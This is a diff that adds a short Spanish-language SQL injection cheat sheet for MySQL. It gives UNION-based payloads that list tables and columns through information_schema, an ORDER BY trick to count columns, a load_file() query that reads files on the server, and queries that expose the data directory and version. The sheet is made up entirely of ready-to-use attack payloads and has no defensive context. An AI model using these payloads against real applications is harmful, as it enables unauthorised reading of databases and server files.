@@ -1,0 +1,15 @@
+# Recuperacion de tablas al interior de una base de datos
+select * from <nombre_tabla> where param_name='toto' union select user(),database(),group_concat(table_name) from information_schema.tables where table_schema=database();
+
+# Con el mismo principio extraccion de todas las columnas de existentes en la base de datos:
+select * from <nombre_tabla> where param_name='toto' union select user(),database(),group_concat(column_name) from information_schema.columns where table_schema=database();
+
+# Encontrar el numero de columnas en una table, metodo simple:
+order by <1> # incrementar el numero para saber si tal numero de columna existe...
+
+# Cargar un fichero
+select * from <nombre_tabla> where param_name='toto' union select user(),database(),load_file("documento");
+
+# Mas information
+select * from <nombre_tabla> where param_name='toto' union select user(),database(),@@datadir;
+select * from <nombre_tabla> where param_name='toto' union select user(),database(),@@version;
